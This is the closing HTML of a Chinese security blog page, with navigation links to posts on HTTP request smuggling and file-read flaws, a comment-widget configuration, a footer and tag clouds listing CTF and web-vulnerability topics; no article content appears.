class=article-nav-title><i class="fa fa-hand-o-left" aria-hidden=true></i> 从一道题到HTTP请求走私</span></a> <a href="/2019/10/19/任意文件读取与下载漏洞/" id=article-nav-older class=article-nav-link-wrap><span class=article-nav-title>任意文件读取与下载漏洞</span> <i class="fa fa-hand-o-right" aria-hidden=true></i></a></nav><section id=comments class=comments><style>
            margin-top:40px;padding:1px 15px 1px 10px;background-color:rgba(255,255,255,0.7);box-shadow: 0px 0px 20px #bbbbbb;border-radius: 5px;
            .comments{margin:30px;padding:10px;background:#fff}
            @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
        </style><div id=vcomment class=comment></div><script src=//cdn1.lncld.net/static/js/3.0.4/av-min.js></script><script src=//unpkg.com/valine/dist/Valine.min.js></script><script src=/js/Valine.min.js></script><script>
   var notify = 'true' == true ? true : false;
   var verify = 'true' == true ? true : false;
    window.onload = function() {
        new Valine({
            av: AV,
            el: '.comment',
            emoticon_url: 'https://cloud.panjunwen.com/alu',
            emoticon_list: ["吐.png","期待.png","高兴.png","吐血倒地.png","哭泣.png","欢呼.png"],
            notify: notify,
            verify: verify,
            app_id: "5cXOwuHg0Yrf8teE1lzRCjHi-gzGzoHsz",
            app_key: "ToPzd33a36q3VXf83omuntVV",
            lang:"zh-cn",
            placeholder: "说点什么吧！",
            avatar:"mp",
            pageSize: "10",
            highlight:"true",
            recordIP:"true"
        });
    }
</script></section></section></div><footer id=footer><div class=outer><div id=footer-info class=inner><p><span id=busuanzi_container_site_uv style=display:none>总访客数：<span id=busuanzi_value_site_uv></span></span> <span id=busuanzi_container_site_pv style=display:none>总访问量：<span id=busuanzi_value_site_pv></span></span></p><p><a href="https://qwzf.github.io/" target=_blank>Q子枫</a> <a href=https://blog.csdn.net/qq_43625917 target=_blank>我的CSDN</a> &copy; 2020 qwzf<br></p></div></div></footer><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><script src=//cdn.bootcss.com/jquery/3.2.1/jquery.min.js></script><script>
  var mihoConfig = {
      root: "https://qwzf.github.io",
      animate: true,
      isHome: false,
      share: true,
      reward: 1
  }
</script><div class=sidebar><div id=sidebar-search title=Search><i class="fa fa-search"></i></div><div id=sidebar-category title=Categories><i class="fa fa-book"></i></div><div id=sidebar-tag title=Tags><i class="fa fa-tags"></i></div><div id=sidebar-top><span class=sidebar-top-icon><i class="fa fa-angle-up"></i></span></div></div><div class=sidebar-menu-box id=sidebar-menu-box><div class=sidebar-menu-box-container><div id=sidebar-menu-box-categories><a class=category-link href="/categories/AWD/">AWD</a><a class=category-link href="/categories/CTF/">CTF</a><a class=category-link href="/categories/Databases/">Databases</a><a class=category-link href="/categories/Docker/">Docker</a><a class=category-link href="/categories/First/">First</a><a class=category-link href="/categories/HTTP/">HTTP</a><a class=category-link href="/categories/Linux/">Linux</a><a class=category-link href="/categories/Python/">Python</a><a class=category-link href="/categories/Web/">Web</a></div><div id=sidebar-menu-box-tags><a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/BUG/" style="font-size: 20px;">BUG</a> <a href="/tags/BUGKU/" style="font-size: 10px;">BUGKU</a> <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CSS/" style="font-size: 10px;">CSS</a> <a href="/tags/CTF/" style="font-size: 18.89px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 14.44px;">Crypto</a> <a href="/tags/DHCP/" style="font-size: 10px;">DHCP</a> <a href="/tags/DNS/" style="font-size: 10px;">DNS</a> <a href="/tags/Databases/" style="font-size: 10px;">Databases</a> <a href="/tags/FTP/" style="font-size: 10px;">FTP</a> <a href="/tags/GET型双查询注入/" style="font-size: 10px;">GET型双查询注入</a> <a href="/tags/GET型盲注/" style="font-size: 10px;">GET型盲注</a> <a href="/tags/GET型错误型注入/" style="font-size: 10px;">GET型错误型注入</a> <a href="/tags/Github/" style="font-size: 10px;">Github</a> <a href="/tags/HTML/" style="font-size: 10px;">HTML</a> <a href="/tags/HTTP/" style="font-size: 11.11px;">HTTP</a> <a href="/tags/Hexo/" style="font-size: 11.11px;">Hexo</a> <a href="/tags/ISCC/" style="font-size: 11.11px;">ISCC</a> <a href="/tags/LAMP与LNMP/" style="font-size: 10px;">LAMP与LNMP</a> <a href="/tags/Linux/" style="font-size: 11.11px;">Linux</a> <a href="/tags/MISC/" style="font-size: 16.67px;">MISC</a> <a href="/tags/MySQL/" style="font-size: 12.22px;">MySQL</a> <a href="/tags/PHP/" style="font-size: 14.44px;">PHP</a> <a href="/tags/POST型报错注入/" style="font-size: 10px;">POST型报错注入</a> <a href="/tags/POST型盲注/" style="font-size: 10px;">POST型盲注</a> <a href="/tags/POST型联合查询注入/" style="font-size: 10px;">POST型联合查询注入</a> <a href="/tags/Python/" style="font-size: 14.44px;">Python</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/Reverse/" style="font-size: 10px;">Reverse</a> <a href="/tags/SQL/" style="font-size: 15.56px;">SQL</a> <a href="/tags/SQL注入/" style="font-size: 10px;">SQL注入</a> <a href="/tags/SQL盲注/" style="font-size: 10px;">SQL盲注</a> <a href="/tags/Web/" style="font-size: 17.78px;">Web</a> <a href="/tags/XML/" style="font-size: 10px;">XML</a> <a href="/tags/XML注入/" style="font-size: 10px;">XML注入</a> <a href="/tags/XSS/" style="font-size: 11.11px;">XSS</a> <a href="/tags/XXE漏洞/" style="font-size: 10px;">XXE漏洞</a> <a href="/tags/Xpath注入/" style="font-size: 10px;">Xpath注入</a> <a href="/tags/ZIP/" style="font-size: 10px;">ZIP</a> <a href="/tags/css/" style="font-size: 10px;">css</a> <a href="/tags/html/" style="font-size: 10px;">html</a> <a href="/tags/i春秋/" style="font-size: 10px;">i春秋</a> <a href="/tags/order-by排序注入/" style="font-size: 10px;">order by排序注入</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/phpstudy/" style="font-size: 10px;">phpstudy</a> <a href="/tags/requests库/" style="font-size: 10px;">requests库</a> <a href="/tags/urllib库/" style="font-size: 10px;">urllib库</a> <a href="/tags/二次注入/" style="font-size: 10px;">二次注入</a> <a href="/tags/任意文件读取与下载漏洞/" style="font-size: 10px;">任意文件读取与下载漏洞</a> <a href="/tags/函数/" style="font-size: 10px;">函数</a> <a href="/tags/前端/" style="font-size: 12.22px;">前端</a> <a href="/tags/协议层/" style="font-size: 10px;">协议层</a> <a href="/tags/南邮/" style="font-size: 11.11px;">南邮</a> <a href="/tags/反序列化漏洞/" style="font-size: 10px;">反序列化漏洞</a> <a href="/tags/命令执行与代码执行/" style="font-size: 10px;">命令执行与代码执行</a> <a href="/tags/基本语法/" style="font-size: 10px;">基本语法</a> <a href="/tags/堆叠注入/" style="font-size: 10px;">堆叠注入</a> <a href="/tags/字符串及正则表达式/" style="font-size: 10px;">字符串及正则表达式</a> <a href="/tags/安恒/" style="font-size: 10px;">安恒</a> <a href="/tags/容器/" style="font-size: 10px;">容器</a> <a href="/tags/宽字节注入/" style="font-size: 10px;">宽字节注入</a> <a href="/tags/导出文件注入/" style="font-size: 10px;">导出文件注入</a> <a href="/tags/序列的应用/" style="font-size: 10px;">序列的应用</a> <a href="/tags/开发/" style="font-size: 13.33px;">开发</a> <a href="/tags/开发工具/" style="font-size: 10px;">开发工具</a> <a href="/tags/异常处理及程序调试/" style="font-size: 10px;">异常处理及程序调试</a> <a href="/tags/抓包/" style="font-size: 10px;">抓包</a> <a href="/tags/报错注入/" style="font-size: 10px;">报错注入</a> <a href="/tags/操作数据库/" style="font-size: 10px;">操作数据库</a> <a href="/tags/攻防世界/" style="font-size: 11.11px;">攻防世界</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/文件上传漏洞/" style="font-size: 11.11px;">文件上传漏洞</a> <a href="/tags/文件包含漏洞/" style="font-size: 10px;">文件包含漏洞</a> <a href="/tags/文件及目录操作/" style="font-size: 10px;">文件及目录操作</a> <a href="/tags/期末复习/" style="font-size: 10px;">期末复习</a> <a href="/tags/模块/" style="font-size: 10px;">模块</a> <a href="/tags/河南高校网安联赛/" style="font-size: 10px;">河南高校网安联赛</a> <a href="/tags/流程控制/" style="font-size: 10px;">流程控制</a> <a href="/tags/源码泄露/" style="font-size: 10px;">源码泄露</a> <a href="/tags/盲注/" style="font-size: 10px;">盲注</a> <a href="/tags/移位编码/" style="font-size: 10px;">移位编码</a> <a href="/tags/简单加密/" style="font-size: 10px;">简单加密</a> <a href="/tags/线下/" style="font-size: 11.11px;">线下</a> <a href="/tags/网络爬虫/" style="font-size: 10px;">网络爬虫</a> <a href="/tags/过滤敏感关键字与WAF绕过/" style="font-size: 10px;">过滤敏感关键字与WAF绕过</a> <a href="/tags/镜像/" style="font-size: 10px;">镜像</a> <a href="/tags/问题整理/" style="font-size: 10px;">问题整理</a> <a href="/tags/隐写/" style="font-size: 11.11px;">隐写</a></div></div><a href=javascript:; class=sidebar-menu-box-close>&times;</a></div><div class=mobile-header-menu-nav id=mobile-header-menu-nav><div class=mobile-header-menu-container><span class=title>Menus</span><ul class=mobile-header-menu-navbar><li><a href="/"><i class="fa fa-home"></i><span>Home</span></a></li><li><a target=_blank href=/archives><i class="fa fa-archive"></i><span>Archives</span></a></li><li><a href=/about><i class="fa fa-user"></i><span>About</span></a></li></ul></div><div class=mobile-header-tag-container><span class=title>Tags</span><div id=mobile-header-container-tags><a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/BUG/" style="font-size: 20px;">BUG</a> <a href="/tags/BUGKU/" style="font-size: 10px;">BUGKU</a> <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CSS/" style="font-size: 10px;">CSS</a> <a href="/tags/CTF/" style="font-size: 18.89px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 14.44px;">Crypto</a> <a href="/tags/DHCP/" style="font-size: 10px;">DHCP</a> <a href="/tags/DNS/" style="font-size: 10px;">DNS</a> <a href="/tags/Databases/" style="font-size: 10px;">Databases</a> <a href="/tags/FTP/" style="font-size: 10px;">FTP</a> <a href="/tags/GET型双查询注入/" style="font-size: 10px;">GET型双查询注入</a> <a href="/tags/GET型盲注/" style="font-size: 10px;">GET型盲注</a> <a href="/tags/GET型错误型注入/" style="font-size: 10px;">GET型错误型注入</a> <a href="/tags/Github/" style="font-size: 10px;">Github</a> <a href="/tags/HTML/" style="font-size: 10px;">HTML</a> <a href="/tags/HTTP/" style="font-size: 11.11px;">HTTP</a> <a href="/tags/Hexo/" style="font-size: 11.11px;">Hexo</a> <a href="/tags/ISCC/" style="font-size: 11.11px;">ISCC</a> <a href="/tags/LAMP与LNMP/" style="font-size: 10px;">LAMP与LNMP</a> <a href="/tags/Linux/" style="font-size: 11.11px;">Linux</a> <a href="/tags/MISC/" style="font-size: 16.67px;">MISC</a> <a href="/tags/MySQL/" style="font-size: 12.22px;">MySQL</a> <a href="/tags/PHP/" style="font-size: 14.44px;">PHP</a> <a href="/tags/POST型报错注入/" style="font-size: 10px;">POST型报错注入</a> <a href="/tags/POST型盲注/" style="font-size: 10px;">POST型盲注</a> <a href="/tags/POST型联合查询注入/" style="font-size: 10px;">POST型联合查询注入</a> <a href="/tags/Python/" style="font-size: 14.44px;">Python</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/Reverse/" style="font-size: 10px;">Reverse</a> <a href="/tags/SQL/" style="font-size: 15.56px;">SQL</a> <a href="/tags/SQL注入/" style="font-size: 10px;">SQL注入</a> <a href="/tags/SQL盲注/" style="font-size: 10px;">SQL盲注</a> <a href="/tags/Web/" style="font-size: 17.78px;">Web</a> <a href="/tags/XML/" style="font-size: 10px;">XML</a> <a href="/tags/XML注入/" style="font-size: 10px;">XML注入</a> <a href="/tags/XSS/" style="font-size: 11.11px;">XSS</a> <a href="/tags/XXE漏洞/" style="font-size: 10px;">XXE漏洞</a> <a href="/tags/Xpath注入/" style="font-size: 10px;">Xpath注入</a> <a href="/tags/ZIP/" style="font-size: 10px;">ZIP</a> <a href="/tags/css/" style="font-size: 10px;">css</a> <a href="/tags/html/" style="font-size: 10px;">html</a> <a href="/tags/i春秋/" style="font-size: 10px;">i春秋</a> <a href="/tags/order-by排序注入/" style="font-size: 10px;">order by排序注入</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/phpstudy/" style="font-size: 10px;">phpstudy</a> <a href="/tags/requests库/" style="font-size: 10px;">requests库</a> <a href="/tags/urllib库/" style="font-size: 10px;">urllib库</a> <a href="/tags/二次注入/" style="font-size: 10px;">二次注入</a> <a href="/tags/任意文件读取与下载漏洞/" style="font-size: 10px;">任意文件读取与下载漏洞</a> <a href="/tags/函数/" style="font-size: 10px;">函数</a> <a href="/tags/前端/" style="font-size: 12.22px;">前端</a> <a href="/tags/协议层/" style="font-size: 10px;">协议层</a> <a href="/tags/南邮/" style="font-size: 11.11px;">南邮</a> <a href="/tags/反序列化漏洞/" style="font-size: 10px;">反序列化漏洞</a> <a href="/tags/命令执行与代码执行/" style="font-size: 10px;">命令执行与代码执行</a> <a href="/tags/基本语法/" style="font-size: 10px;">基本语法</a> <a href="/tags/堆叠注入/" style="font-size: 10px;">堆叠注入</a> <a href="/tags/字符串及正则表达式/" style="font-size: 10px;">字符串及正则表达式</a> <a href="/tags/安恒/" style="font-size: 10px;">安恒</a> <a href="/tags/容器/" style="font-size: 10px;">容器</a> <a href="/tags/宽字节注入/" style="font-size: 10px;">宽字节注入</a> <a href="/tags/导出文件注入/" style="font-size: 10px;">导出文件注入</a> <a href="/tags/序列的应用/" style="font-size: 10px;">序列的应用</a> <a href="/tags/开发/" style="font-size: 13.33px;">开发</a> <a href="/tags/开发工具/" style="font-size: 10px;">开发工具</a> <a href="/tags/异常处理及程序调试/" style="font-size: 10px;">异常处理及程序调试</a> <a href="/tags/抓包/" style="font-size: 10px;">抓包</a> <a href="/tags/报错注入/" style="font-size: 10px;">报错注入</a> <a href="/tags/操作数据库/" style="font-size: 10px;">操作数据库</a> <a href="/tags/攻防世界/" style="font-size: 11.11px;">攻防世界</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/文件上传漏洞/" style="font-size: 11.11px;">文件上传漏洞</a> <a href="/tags/文件包含漏洞/" style="font-size: 10px;">文件包含漏洞</a> <a href="/tags/文件及目录操作/" style="font-size: 10px;">文件及目录操作</a> <a href="/tags/期末复习/" style="font-size: 10px;">期末复习</a> <a href="/tags/模块/" style="font-size: 10px;">模块</a> <a href="/tags/河南高校网安联赛/" style="font-size: 10px;">河南高校网安联赛</a> <a href="/tags/流程控制/" style="font-size: 10px;">流程控制</a> <a href="/tags/源码泄露/" style="font-size: 10px;">源码泄露</a> <a href="/tags/盲注/" style="font-size: 10px;">盲注</a> <a href="/tags/移位编码/" style="font-size: 10px;">移位编码</a> <a href="/tags/简单加密/" style="font-size: 10px;">简单加密</a> <a href="/tags/线下/" style="font-size: 11.11px;">线下</a> <a href="/tags/网络爬虫/" style="font-size: 10px;">网络爬虫</a> <a href="/tags/过滤敏感关键字与WAF绕过/" style="font-size: 10px;">过滤敏感关键字与WAF绕过</a> <a href="/tags/镜像/" style="font-size: 10px;">镜像</a> <a href="/tags/问题整理/" style="font-size: 10px;">问题整理</a> <a href="/tags/隐写/" style="font-size: 11.11px;">隐写</a></div></div></div><div class=search-wrap><span class=search-close>&times;</span> <a href=javascript:; class="header-icon waves-effect waves-circle waves-light" id=back><i class="icon icon-lg icon-chevron-left"></i></a> <input class=search-field placeholder=Search... id=keywords> <a id=search-submit href=javascript:;><i class="fa fa-search"></i></a><div class=search-container id=search-container><ul class=search-result id=search-result></ul></div></div><div id=search-tpl><li class=search-result-item><a href={url} class=search-item-li><span class=search-item-li-title title={title}>{title}</span></a></li></div><script src=/js/search.js></script><script src=/js/main.js></script><script src=//cdn.bootcss.com/particles.js/2.0.0/particles.min.js></script><div id=particles></div><script src=/js/particles.js></script><link rel=stylesheet href=//cdn.bootcss.com/animate.css/3.5.0/animate.min.css><script src=//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js></script><script src=/js/animate.js></script><script src=/js/pop-img.js></script><script>
     $(".article-entry p img").popImg();
  </script><script type=text/javascript src=/js/clicklove.js></script></div><script src=/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>